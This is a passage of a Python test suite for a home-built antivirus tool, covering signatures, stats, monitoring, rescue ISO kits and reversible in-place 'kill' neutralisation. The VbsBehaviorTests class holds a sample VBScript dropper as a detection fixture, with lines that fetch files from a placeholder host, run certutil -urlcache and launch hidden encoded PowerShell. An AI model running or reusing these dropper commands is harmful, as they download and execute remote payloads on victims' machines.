        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["sig", "--signatures", str(dbfile),
                           "import", str(ioc), "--source", "feed",
                           "--severity", "high"])
            self.assertEqual(rc, 0)
            self.assertIn("Imported 2", buf.getvalue())

            db = SignatureDB(dbfile)
            sigs = {s.id: s for s in db.list()}
            self.assertEqual(len(sigs), 2)
            md5_sig = next(s for s in sigs.values() if s.md5)
            pat_sig = next(s for s in sigs.values() if s.pattern)
            self.assertEqual(md5_sig.severity, "high")
            self.assertEqual(pat_sig.category, "feed")

            # re-import: both skipped as already present
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["sig", "--signatures", str(dbfile),
                           "import", str(ioc)])
            self.assertEqual(rc, 0)
            self.assertIn("2 already present", buf.getvalue())

            # end-to-end: the md5 IOC catches EICAR, the literal catches its marker
            scanner = Scanner(App(base).config, db, threads=1)
            (base / "e.txt").write_bytes(EICAR)
            findings = scanner.scan_file(base / "e.txt")
            self.assertTrue(any("IOC" in f.name for f in findings))
            (base / "m.txt").write_text("prefix MY-UNIQUE-MARKER-77 suffix\n")
            findings = scanner.scan_file(base / "m.txt")
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0].severity, "high")
        finally:
            os.chdir(old_cwd)


class StatsTests(unittest.TestCase):
    """v1.9: `stats` – engine statistics (CLI + /api/stats)."""

    def test_cli_stats_json(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-stats-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        app = App(base)
        app.scanner.config.cache_enabled = False
        (base / "e.txt").write_bytes(EICAR)
        (base / "c.txt").write_text("fine\n")

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["scan", str(base), "--json"])
            self.assertEqual(rc, 1)
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["stats", "--json"])
        finally:
            os.chdir(old_cwd)
        self.assertEqual(rc, 0)
        data = json.loads(buf.getvalue())
        self.assertEqual(data["signatures"]["total"],
                         len(SignatureDB(app.config.signatures_file).list()))
        self.assertGreaterEqual(data["cache"]["entries"], 2)
        self.assertGreater(data["cache"]["size_bytes"], 0)
        self.assertEqual(data["quarantine"]["items"], 0)
        self.assertEqual(data["reports"]["reports"], 1)
        self.assertEqual(data["reports"]["infected"], 1)
        self.assertEqual(data["reports"]["total_findings"], 1)

    def test_cli_stats_human(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-stats2-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        App(base)
        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["stats", "--no-reports"])
        finally:
            os.chdir(old_cwd)
        self.assertEqual(rc, 0)
        out = buf.getvalue()
        self.assertIn("engine statistics", out)
        self.assertIn("Signatures:", out)
        self.assertIn("Scan cache:", out)
        self.assertIn("Quarantine:", out)


class ProgressTests(unittest.TestCase):
    """v1.9: Scanner.on_progress ticks per file (bar plumbing)."""

    def test_progress_ticks_sequential_and_cached(self):
        base = Path(tempfile.mkdtemp(prefix="av-prog-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        app = App(base)
        d = base / "tree"
        d.mkdir()
        for i in range(5):
            (d / f"f{i}.txt").write_text(f"content {i}\n")

        calls = []
        app.scanner.on_progress = lambda done, total: calls.append((done, total))
        result = app.scanner.scan_path(d)
        self.assertEqual(len(calls), 5)
        self.assertEqual([c[0] for c in calls], [1, 2, 3, 4, 5])
        self.assertTrue(all(c[1] == 5 for c in calls))

        # a cached rescan still ticks (cached files are progress too)
        calls.clear()
        result2 = app.scanner.scan_path(d)
        self.assertEqual(len(calls), 5)
        self.assertEqual(result2.files_cached, 5)

    def test_progress_callback_exception_is_swallowed(self):
        base = Path(tempfile.mkdtemp(prefix="av-prog2-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        app = App(base)
        d = base / "tree"
        d.mkdir()
        (d / "a.txt").write_text("fine\n")

        def broken(done, total):
            raise RuntimeError("boom")

        app.scanner.on_progress = broken
        result = app.scanner.scan_path(d)  # must not raise
        self.assertTrue(result.clean)

    def test_cli_progress_bar_renders(self):
        from antivirus.cli import _ProgressBar

        buf = io.StringIO()
        bar = _ProgressBar(interval=0)  # no throttling in the test
        with contextlib.redirect_stderr(buf):
            bar(1, 10)
            bar(5, 10)
            bar(10, 10)
        out = buf.getvalue()
        self.assertIn("5/10", out)
        self.assertIn("10/10", out)
        self.assertIn("###", out)


class MonitorEventTests(unittest.TestCase):
    """v1.9: DirectoryWatcher structured events (monitor --json)."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-mon-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.app.scanner.config.cache_enabled = False
        self.watch = base / "watch"
        self.watch.mkdir()

    def test_events_for_clean_threat_and_removed(self):
        from antivirus.monitor import DirectoryWatcher

        events = []
        watcher = DirectoryWatcher(self.app.scanner, self.app.quarantine,
                                   action="detect", interval=0.1,
                                   log=lambda level, message: None,
                                   on_event=events.append)
        watcher._state = watcher._snapshot(self.watch)

        (self.watch / "ok.txt").write_text("fine\n")
        (self.watch / "bad.txt").write_bytes(EICAR)
        watcher.process(watcher.poll(self.watch))
        names = {(e["event"], e.get("path", "")) for e in events}
        self.assertIn(("clean", str(self.watch / "ok.txt")), names)
        threat = next(e for e in events if e["event"] == "threat")
        self.assertEqual(threat["path"], str(self.watch / "bad.txt"))
        self.assertEqual(threat["severity"], "critical")
        self.assertEqual(threat["findings"], 1)

        (self.watch / "ok.txt").unlink()
        events.clear()
        watcher.process(watcher.poll(self.watch))
        self.assertEqual([e["event"] for e in events], ["removed"])
        self.assertEqual(events[0]["path"], str(self.watch / "ok.txt"))

    def test_event_hook_failure_is_swallowed(self):
        from antivirus.monitor import DirectoryWatcher

        def broken(event):
            raise RuntimeError("boom")

        watcher = DirectoryWatcher(self.app.scanner, self.app.quarantine,
                                   action="detect", interval=0.1,
                                   log=lambda level, message: None,
                                   on_event=broken)
        watcher._state = watcher._snapshot(self.watch)
        (self.watch / "ok.txt").write_text("fine\n")
        watcher.process(watcher.poll(self.watch))  # must not raise


class WebStatsAndVerifyTests(WebConsoleTests):
    """v1.9: web API additions (/api/stats, /api/verify)."""

    def test_stats_api(self):
        (self.base / "e.txt").write_bytes(EICAR)
        status, data = self._req("POST", "/api/scan", {"target": str(self.base)})
        job = data["job"]
        for _ in range(50):
            time.sleep(0.2)
            status, detail = self._req("GET", f"/api/jobs/{job['id']}")
            if detail["job"]["status"] != "running":
                break
        self.assertEqual(detail["job"]["status"], "done")

        status, data = self._req("GET", "/api/stats")
        self.assertEqual(status, 200)
        self.assertEqual(data["signatures"]["total"],
                         len(self.app_fixture.db.list()))
        self.assertEqual(data["quarantine"]["items"], 0)
        self.assertEqual(data["reports"]["reports"], 1)
        self.assertEqual(data["reports"]["infected"], 1)

    def test_verify_api(self):
        from antivirus.integrity import build_manifest

        d = self.base / "tree"
        d.mkdir()
        (d / "a.txt").write_text("one\n")
        bfile = self.base / "b.json"
        from antivirus.integrity import save_manifest

        save_manifest(build_manifest(d, self.app_fixture.config), bfile)

        status, data = self._req(
            "GET", "/api/verify?target=" + urllib_parse(d) +
            "&baseline=" + urllib_parse(bfile))
        self.assertEqual(status, 200)
        self.assertTrue(data["clean"])

        (d / "a.txt").write_text("CHANGED\n")
        status, data = self._req(
            "GET", "/api/verify?target=" + urllib_parse(d) +
            "&baseline=" + urllib_parse(bfile))
        self.assertEqual(status, 200)
        self.assertEqual(data["changed"], 1)
        self.assertEqual(len(data["findings"]), 1)

        status, data = self._req(
            "GET", "/api/verify?target=" + urllib_parse(d))
        self.assertEqual(status, 400)
        status, data = self._req(
            "GET", "/api/verify?target=" + urllib_parse(d) +
            "&baseline=no-such-id")
        self.assertEqual(status, 400)


class Iso9660Tests(unittest.TestCase):
    """v2.0: the pure-Python ISO 9660 writer produces a valid image."""

    def _build(self, files):
        from antivirus.rescue import build_iso9660

        base = Path(tempfile.mkdtemp(prefix="av-iso-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        out = base / "x.iso"
        size = build_iso9660(out, files)
        return base, out.read_bytes(), size

    def test_structure_and_contents(self):
        data_a = b"hello world\n"
        data_b = b"\x00" * 5000 + b"tail"
        _base, img, size = self._build({"a.txt": data_a, "b.bin": data_b})
        self.assertEqual(size, len(img))
        self.assertEqual(len(img) % 2048, 0)
        sector = 2048

        # PVD
        self.assertEqual(img[2048:2053], b"CD001")
        self.assertEqual(img[2053], 1)
        self.assertEqual(img[2054], 1)
        self.assertEqual(img[2087:2119].rstrip(b" ").decode(),
                         "ANTIVIRUS-RESCUE")
        self.assertEqual(int.from_bytes(img[2119:2123], "little"),
                         len(img) // sector)
        self.assertEqual(int.from_bytes(img[2431 + 2:2431 + 6], "little"), 3)
        # SVD
        self.assertEqual(img[4096:4101], b"CD001")
        self.assertEqual(img[4102], 255)

        # root directory: extents must point at the exact file bytes
        root = img[3 * sector:4 * sector]
        off, found = 0, {}
        while off < sector and root[off] != 0:
            n = root[off]
            ext = int.from_bytes(root[off + 2:off + 6], "little")
            fsize = int.from_bytes(root[off + 10:off + 14], "little")
            flags = root[off + 25]
            namelen = root[off + 32]
            name = root[off + 33:off + 33 + namelen].decode()
            if name not in (".", ".."):
                self.assertEqual(flags, 0)
                found[name] = (ext, fsize)
            off += n
        self.assertEqual(set(found), {"A.TXT", "B.BIN"})
        ext, n = found["A.TXT"]
        self.assertEqual(img[ext * sector:ext * sector + n], data_a)
        ext, n = found["B.BIN"]
        self.assertEqual(img[ext * sector:ext * sector + n], data_b)

        # both path tables: 1 (root) + 2 file entries
        for off_pt in (4, 5):
            table = img[off_pt * sector:(off_pt + 1) * sector]
            off, entries = 0, 0
            while off < sector and table[off] != 0:
                n = table[off]
                self.assertEqual(table[off + 1], 2)  # parent = root
                self.assertEqual(int.from_bytes(table[off + 2:off + 4],
                                                "little"),
                                 int.from_bytes(table[off + 4:off + 6],
                                                "big"))
                off += n
                entries += 1
            self.assertEqual(entries, 3)

    def test_invalid_names_and_empty(self):
        from antivirus.rescue import build_iso9660

        base = Path(tempfile.mkdtemp(prefix="av-iso-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        with self.assertRaises(ValueError):
            build_iso9660(base / "x.iso", {})
        with self.assertRaises(ValueError):
            build_iso9660(base / "x.iso", {"has space.txt": b"y"})
        with self.assertRaises(ValueError):
            build_iso9660(base / "x.iso",
                          {"x" * 40 + ".txt": b"y"})

    def test_sector_aligned_file_size(self):
        # a file exactly N*2048 bytes must not gain an extra sector
        data = b"\x00" * (2 * 2048)
        _base, img, size = self._build({"big.bin": data})
        self.assertEqual(len(img), 6 * 2048 + 2 * 2048)


class RescueKitTests(unittest.TestCase):
    """v2.0: the rescue kit is self-contained and manifest-verified."""

    def _build(self, **kwargs):
        from antivirus.rescue import build_rescue_kit

        base = Path(tempfile.mkdtemp(prefix="av-rkit-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        kit = base / "kit"
        manifest = build_rescue_kit(kit, **kwargs)
        return base, kit, manifest

    def test_build_and_verify_clean_and_corrupted(self):
        from antivirus.rescue import verify_kit

        base, kit, manifest = self._build()
        self.assertEqual(verify_kit(kit), [])
        self.assertGreaterEqual(manifest["signatures"]["count"], 1)
        for name in ("run-rescue.py", "bootstrap.sh", "bootstrap.bat",
                     "antivirus.zip", "signatures.json",
                     "rescue-manifest.json"):
            self.assertTrue((kit / name).exists(), name)
        self.assertTrue((kit / "antivirus" / "__init__.py").exists())
        self.assertTrue((kit / "bootstrap.sh").stat().st_mode & 0o111)

        (kit / "signatures.json").write_bytes(b"corrupted")
        problems = verify_kit(kit)
        self.assertTrue(any("signatures.json" in p for p in problems))

    def test_kit_package_is_self_contained(self):
        from antivirus.rescue import build_rescue_kit

        import subprocess
        import sys as _sys

        base = Path(tempfile.mkdtemp(prefix="av-rpkg-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        kit = base / "kit"
        build_rescue_kit(kit)
        (base / "e.txt").write_bytes(EICAR)

        # a fresh interpreter must be able to import the kit's copy of the
        # package and detect EICAR using the kit's own signature database
        code = (
            "import sys\n"
            f"sys.path.insert(0, {str(kit)!r})\n"
            "import antivirus\n"
            "from antivirus.scanner import Scanner\n"
            "from antivirus.signatures import SignatureDB\n"
            f"db = SignatureDB({str(kit / 'signatures.json')!r})\n"
            f"f = Scanner(antivirus.config.Config(), db).scan_file("
            f"{str(base / 'e.txt')!r})\n"
            "assert any(x.kind == 'signature-hash' for x in f), f\n"
            "print('KIT-OK')\n"
        )
        proc = subprocess.run([_sys.executable, "-c", code],
                              capture_output=True, text=True, timeout=120)
        self.assertIn("KIT-OK", proc.stdout, proc.stderr)

    def test_default_signature_db_has_eicar(self):
        from antivirus.rescue import _default_signature_db

        db = _default_signature_db()
        self.assertEqual(len(db["signatures"]), 1)
        sig = db["signatures"][0]
        self.assertEqual(sig["id"], "EICAR-STD-2014")
        self.assertEqual(len(sig["sha256"]), 64)
        self.assertEqual(len(sig["md5"]), 32)

        base = Path(tempfile.mkdtemp(prefix="av-rdef-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        p = base / "db.json"
        p.write_text(json.dumps(db, indent=2) + "\n")
        loaded = SignatureDB(p)
        self.assertEqual(len(loaded.list()), 1)
        (base / "e.txt").write_bytes(EICAR)
        self.assertTrue(loaded.by_sha256(
            __import__("hashlib").sha256(EICAR).hexdigest()))

    def test_iso_variant_verify(self):
        from antivirus.rescue import build_rescue_disk, verify_kit

        base = Path(tempfile.mkdtemp(prefix="av-riso-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        kit = base / "kit"
        manifest = build_rescue_disk(kit, base / "rescue.iso")
        self.assertTrue(manifest["iso"].endswith(".iso"))
        self.assertEqual(manifest["iso_size"] % 2048, 0)
        # simulate an ISO mount: zip variant, no antivirus/ directory
        mounted = base / "mounted"
        mounted.mkdir()
        for name in ("antivirus.zip", "run-rescue.py", "signatures.json",
                     "rescue-manifest.json", "bootstrap.sh",
                     "bootstrap.bat", "README-RESCUE.txt"):
            shutil.copyfile(kit / name, mounted / name)
        self.assertEqual(verify_kit(mounted), [])


class RescueRunTests(unittest.TestCase):
    """v2.0: rescue scans quarantine to the live side, never the target."""

    def _disk(self, base):
        disk = base / "sda1"
        (disk / "user").mkdir(parents=True)
        (disk / "user" / "clean.txt").write_text("fine\n")
        (disk / "user" / "trojan.txt").write_bytes(EICAR)
        return disk

    def test_quarantine_goes_to_rescue_side(self):
        from antivirus.rescue import run_rescue

        base = Path(tempfile.mkdtemp(prefix="av-rrun-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        disk = self._disk(base)
        media_q = base / "usb" / "quarantine"

        info = run_rescue(disk, action="quarantine",
                          quarantine_dir=str(media_q),
                          report_dir=str(base / "usb" / "reports"))
        self.assertEqual(len(info["result"].findings), 1)
        self.assertFalse((disk / "user" / "trojan.txt").exists())
        self.assertTrue((disk / "user" / "clean.txt").exists())
        self.assertEqual(len(list((media_q / "files").glob("*"))), 1)
        self.assertTrue(info["report"].exists())
        # the scanned tree must not host any rescue artefacts
        self.assertFalse((disk / "rescue-quarantine").exists())
        self.assertFalse((disk / "rescue-reports").exists())
        self.assertFalse((disk / "quarantine").exists())

    def test_detect_leaves_tree_untouched(self):
        from antivirus.rescue import run_rescue

        base = Path(tempfile.mkdtemp(prefix="av-rrun2-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        disk = self._disk(base)
        info = run_rescue(disk, action="detect",
                          quarantine_dir=str(base / "q"),
                          report_dir=str(base / "r"))
        self.assertEqual(info["result"].files_scanned, 2)
        self.assertTrue((disk / "user" / "trojan.txt").exists())
        self.assertEqual(len(list((base / "q" / "files").glob("*"))), 0)

    def test_invalid_action_and_missing_target(self):
        from antivirus.rescue import run_rescue

        base = Path(tempfile.mkdtemp(prefix="av-rrun3-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        disk = self._disk(base)
        with self.assertRaises(ValueError):
            run_rescue(disk, action="nuke")
        with self.assertRaises(FileNotFoundError):
            run_rescue(base / "nope")


class RescueCliTests(unittest.TestCase):
    """v2.0: `antivirus rescue build / run / verify` end to end."""

    def test_full_flow(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-rcli-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            def run(*argv):
                out, err = io.StringIO(), io.StringIO()
                with contextlib.redirect_stdout(out), \
                        contextlib.redirect_stderr(err):
                    rc = main(list(argv))
                return rc, out.getvalue(), err.getvalue()

            rc, out, _ = run("rescue", "build", "--out", "kit",
                             "--iso", "rescue.iso")
            self.assertEqual(rc, 0)
            self.assertIn("Rescue kit built", out)
            self.assertTrue((base / "rescue.iso").exists())
            self.assertTrue((base / "kit" / "bootstrap.sh").exists())

            rc, out, _ = run("rescue", "verify", "kit")
            self.assertEqual(rc, 0)
            self.assertIn("Verification OK", out)

            (base / "kit" / "signatures.json").write_bytes(b"bad")
            rc, out, _ = run("rescue", "verify", "kit")
            self.assertEqual(rc, 1)
            self.assertIn("FAILED", out)

            disk = base / "sda1"
            (disk / "u").mkdir(parents=True)
            (disk / "u" / "t.txt").write_bytes(EICAR)
            rc, out, _ = run("rescue", "run", str(disk), "--action",
                             "quarantine", "--rescue-quarantine", "rq",
                             "--rescue-reports", "rr", "--json")
            self.assertEqual(rc, 1)
            data = json.loads(out)
            self.assertEqual(len(data["findings"]), 1)
            self.assertEqual(data["rescue"]["quarantine_dir"],
                             str(base / "rq"))
            self.assertFalse((disk / "u" / "t.txt").exists())
            self.assertTrue((base / "rq" / "files").exists())
        finally:
            os.chdir(old_cwd)

    def test_run_missing_target(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-rcli2-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            err = io.StringIO()
            with contextlib.redirect_stdout(io.StringIO()), \
                    contextlib.redirect_stderr(err):
                rc = main(["rescue", "run", "nope"])
            self.assertEqual(rc, 2)
            self.assertIn("no such file or directory", err.getvalue())
        finally:
            os.chdir(old_cwd)


class RescueWebTests(WebConsoleTests):
    """v2.0: web rescue build + status."""

    def test_rescue_build_and_status(self):
        status, data = self._req("GET", "/api/rescue")
        self.assertEqual(status, 404)

        kit = self.base / "kit"
        iso = self.base / "rescue.iso"
        status, data = self._req("POST", "/api/rescue/build",
                                 {"out": str(kit), "iso": str(iso)})
        self.assertEqual(status, 200)
        self.assertTrue(kit.exists())
        self.assertTrue(iso.exists())
        self.assertGreater(data["iso_size"], 0)
        self.assertEqual(data["signatures"],
                         len(self.app_fixture.db.list()))

        status, data = self._req("GET", "/api/rescue")
        self.assertEqual(status, 200)
        self.assertEqual(data["kit"], str(kit))
        self.assertEqual(data["iso"], str(iso))
        self.assertIn("files", data)


class RescueModuleTests(unittest.TestCase):
    """v2.0: rescue is part of the plain-module API."""

    def test_rescue_build_and_run(self):
        import antivirus

        base = Path(tempfile.mkdtemp(prefix="av-rmod-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        manifest = antivirus.rescue_build(out_dir=base / "kit",
                                          iso_path=base / "rescue.iso")
        self.assertEqual(manifest["iso_size"] % 2048, 0)
        self.assertTrue((base / "rescue.iso").exists())
        from antivirus.rescue import verify_kit
        self.assertEqual(verify_kit(base / "kit"), [])

        disk = base / "disk"
        disk.mkdir()
        (disk / "e.txt").write_bytes(EICAR)
        info = antivirus.run_rescue(disk, action="quarantine",
                                    quarantine_dir=str(base / "q"),
                                    report_dir=str(base / "r"),
                                    signatures_file=str(
                                        (base / "kit") / "signatures.json"))
        self.assertEqual(len(info["result"].findings), 1)
        self.assertFalse((disk / "e.txt").exists())


class VbsBehaviorTests(unittest.TestCase):
    """v2.1: the VBScript / Windows Script Host behaviour layer."""

    DROPPER = (
        "Set shell = CreateObject(\"WScript.Shell\")\n"
        "Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")\n"
        "http.Open \"GET\", \"http://malware-sample.example.com/s.bin\", "
        "False\n"
        "http.Send\n"
        "shell.Run \"certutil -urlcache -f "
        "http://malware-sample.example.com/d.exe\", 0\n"
        "shell.Run \"powershell -nop -w 0 -enc SQBFAFgAIA==\", 0\n"
    )

    def _analyze(self, text, name="x.vbs"):
        from antivirus.behavior import analyze_file

        p = Path(name)
        return analyze_file(p, None, text.encode())

    def test_dropper_flagged(self):
        findings = self._analyze(self.DROPPER)
        names = {f.name for f in findings}
        self.assertIn("Shell command execution", names)
        self.assertIn("HTTP download", names)
        self.assertIn("certutil URL download (LOLBin)", names)
        self.assertIn("hidden PowerShell launched from script", names)
        self.assertTrue(all(f.severity == "high" for f in findings))

    def test_harmless_clean(self):
        findings = self._analyze(
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
            "WScript.Echo \"done\" & Now()\n")
        self.assertEqual(findings, [])

    def test_vbe_encoded(self):
        # real VBE files are "SSe" + base64 (always =-padded)
        text = "SSe" + "QWVJREFRakFBRkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB="
        names = {f.name for f in self._analyze(text)}
        self.assertIn("VBE-encoded VBScript", names)

    def test_wmi_and_dynamic_execute(self):
        text = (
            "Set w = GetObject(\"winmgmts:\\\\.\\\\root\\\\cimv2\")\n"
            "w.ExecQuery(\"SELECT * FROM Win32_Process\")\n"
            "x = Chr(65) & Chr(66)\n"
            "Execute x\n"
        )
        names = {f.name for f in self._analyze(text)}
        self.assertIn("WMI Win32_Process.Create (process creation)", names)
        self.assertIn("Dynamic code execution", names)

    def test_chained_dropper_from_samples(self):
        from antivirus.samples import build_all_samples

        base = Path(tempfile.mkdtemp(prefix="av-vbs-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        out = base / "samples"
        build_all_samples(out)
        self.assertTrue((out / "behavior" / "dropper.vbs").exists())
        self.assertTrue((out / "behavior" / "harmless-vbs.vbs").exists())

        import antivirus

        cfg = antivirus.config.Config()
        cfg.cache_enabled = False
        from antivirus.scanner import Scanner
        from antivirus.signatures import SignatureDB

        db = SignatureDB(Path("data/signatures.json"))
        sc = Scanner(cfg, db)
        res = sc.scan_path(out)
        dropper = [f for f in res.findings
                   if f.path.endswith("dropper.vbs")]
        harmless = [f for f in res.findings
                    if f.path.endswith("harmless-vbs.vbs")]
        self.assertGreaterEqual(len(dropper), 3)
        self.assertEqual(harmless, [])


class KillCipherTests(unittest.TestCase):
    """v2.2: the kill keystream cipher (stdlib-only, reversible)."""

    KEY = bytes(range(32))
    IV = bytes(range(100, 116))

    def test_round_trip_and_determinism(self):
        from antivirus.kill import transform

        data = os.urandom(3 * 1024 * 1024)  # 3 MiB
        a = transform(data, self.KEY, self.IV)
        b = transform(data, self.KEY, self.IV)
        self.assertEqual(a, b)                     # deterministic
        self.assertNotEqual(a, data)               # actually obfuscated
        self.assertEqual(transform(a, self.KEY, self.IV), data)

    def test_empty(self):
        from antivirus.kill import transform

        self.assertEqual(transform(b"", self.KEY, self.IV), b"")

    def test_wrong_key_does_not_restore(self):
        from antivirus.kill import transform

        data = os.urandom(4096)
        cipher = transform(data, self.KEY, self.IV)
        self.assertNotEqual(transform(cipher, bytes(32), self.IV), data)
        self.assertNotEqual(transform(cipher, self.KEY, bytes(16)), data)

    def test_new_key_iv_sizes(self):
        from antivirus.kill import IV_SIZE, KEY_SIZE, new_key_iv

        key, iv = new_key_iv()
        self.assertEqual(len(key), KEY_SIZE)
        self.assertEqual(len(iv), IV_SIZE)


class KillRegistryTests(unittest.TestCase):
    """v2.2: the registry — key/IV store with kill/revive/purge."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-kill-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.registry_dir = base / "registry"
        from antivirus.kill import KillRegistry

        self.registry = KillRegistry(self.registry_dir)

    def _victim(self, name="virus.bin"):
        p = self.base / name
        p.write_bytes(EICAR)
        app = App(self.base / "app")
        app.scanner.config.cache_enabled = False
        return p, app.scanner.scan_file(p)[0]

    def test_kill_revive_purge_cycle(self):
        p, finding = self._victim()
        item = self.registry.kill(p, finding)
        self.assertTrue(p.exists())                    # stays in place
        self.assertNotEqual(p.read_bytes(), EICAR)    # but is obfuscated
        self.assertEqual(len(self.registry.entries()), 1)
        entry = self.registry.by_ciphertext_sha256(
            hashlib.sha256(p.read_bytes()).hexdigest())
        self.assertEqual(entry["id"], item.id)

        _revived, target = self.registry.revive(item.id)
        self.assertEqual(target.read_bytes(), EICAR)  # exact original bytes
        self.assertEqual(self.registry.entries(), [])  # entry consumed

        p, finding = self._victim("virus2.bin")
        item2 = self.registry.kill(p, finding)
        self.registry.purge(item2.id[:8])
        self.assertFalse(p.exists())
        self.assertEqual(self.registry.entries(), [])

    def test_revive_refuses_tampered_file(self):
        p, finding = self._victim()
        item = self.registry.kill(p, finding)
        p.write_bytes(b"attacker tampering")
        with self.assertRaises(ValueError):
            self.registry.revive(item.id)
        self.assertEqual(len(self.registry.entries()), 1)  # entry kept

    def test_revive_missing_file(self):
        p, finding = self._victim()
        item = self.registry.kill(p, finding)
        p.unlink()
        with self.assertRaises(FileNotFoundError):
            self.registry.revive(item.id)

    def test_id_prefix_and_ambiguity(self):
        pa, fa = self._victim("a.bin")
        a = self.registry.kill(pa, fa)
        pb, fb = self._victim("b.bin")
        b = self.registry.kill(pb, fb)
        # both victims are EICAR -> ids share the 12-hex sha prefix
        common = a.id[:12]
        self.assertTrue(b.id.startswith(common))
        with self.assertRaises(ValueError):
            self.registry.revive(common)  # ambiguous
        with self.assertRaises(KeyError):
            self.registry.revive("deadbeef")  # unknown
        # the full id is always unambiguous
        self.assertEqual(self.registry.revive(a.id)[0].id, a.id)
        self.registry.purge(b.id)


class KillScanTests(unittest.TestCase):
    """v2.2: kill as a scan action + registry-aware rescans."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-kscan-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.app.scanner.config.cache_enabled = False

    def _antivirus(self):
        from antivirus import Antivirus

        av = Antivirus(config=self.app.config, signatures=None)
        av.scanner.config.cache_enabled = False
        return av

    def test_kill_action_via_module_api(self):
        av = self._antivirus()
        (self.base / "virus.txt").write_bytes(EICAR)
        result = av.scan(self.base, action="kill")
        self.assertFalse(result.clean)
        self.assertTrue(any(n.startswith("killed in place")
                            for n in result.notes.values()))
        self.assertNotIn(EICAR, (self.base / "virus.txt").read_bytes())
        items = av.kill_list()
        self.assertEqual(len(items), 1)
        # rescan: inert (neutralized), no findings
        again = av.scan(self.base, cache=False)
        self.assertTrue(again.clean)
        self.assertEqual(again.files_neutralized, 1)
        # revive
        item, target = av.kill_revive(items[0].id)
        self.assertEqual(target.read_bytes(), EICAR)
        self.assertEqual(av.kill_list(), [])

    def test_kill_invalid_action_rejected(self):
        av = self._antivirus()
        with self.assertRaises(ValueError):
            av.scan(self.base, action="nuke")

    def test_archive_entry_kill_hits_container_once(self):
        import zipfile

        z = self.base / "bundle.zip"
        with zipfile.ZipFile(z, "w") as zf:
            zf.writestr("payload/eicar.txt", EICAR)
            zf.writestr("clean.txt", b"ok\n")
        av = self._antivirus()
        result = av.scan(z, action="kill", cache=False)
        self.assertFalse(result.clean)
        # two findings (container pattern + entry hash), ONE kill
        self.assertEqual(len([n for n in result.notes.values()
                              if n.startswith("killed")]), 1)
        self.assertEqual(len(av.kill_list()), 1)
        self.assertFalse(zipfile.is_zipfile(z))  # container obfuscated
        item, target = av.kill_revive(av.kill_list()[0].id)
        self.assertEqual(target.read_bytes(), z.read_bytes())
        self.assertTrue(zipfile.is_zipfile(z))    # restored intact

    def test_scan_json_reports_neutralized_count(self):
        av = self._antivirus()
        (self.base / "v.txt").write_bytes(EICAR)
        av.scan(self.base, action="kill", cache=False)
        again = av.scan(self.base, cache=False)
        data = again.to_dict()
        self.assertEqual(data["files_neutralized"], 1)
        self.assertTrue(again.clean)

    def test_tui_action_cycle_includes_kill(self):
        from antivirus.tui import ACTIONS

        self.assertEqual(ACTIONS, ("detect", "quarantine", "kill", "delete"))


class KillCLITests(unittest.TestCase):
    """v2.2: `antivirus scan --action kill` + `antivirus kill …`."""

    def setUp(self):
        self.base = Path(tempfile.mkdtemp(prefix="av-kcli-"))
        self.addCleanup(lambda: shutil.rmtree(self.base, ignore_errors=True))

    def _run(self, *argv):
        from antivirus.cli import main

        self.rc = None
        out, err = io.StringIO(), io.StringIO()
        old = os.getcwd()
        os.chdir(self.base)
        try:
            with contextlib.redirect_stdout(out), \
                    contextlib.redirect_stderr(err):
                self.rc = main(list(argv))
        finally:
            os.chdir(old)
        return self.rc, out.getvalue(), err.getvalue()

    def test_full_kill_flow(self):
        (self.base / "virus.txt").write_bytes(EICAR)
        rc, out, _ = self._run("scan", ".", "--action", "kill",
                               "--no-cache")
        self.assertEqual(rc, 1)  # infected
        self.assertIn("killed in place", out)
        self.assertIn("Top threats by file", out)
        self.assertNotIn(EICAR, (self.base / "virus.txt").read_bytes())

        rc, out, _ = self._run("kill", "list")
        self.assertEqual(rc, 0)
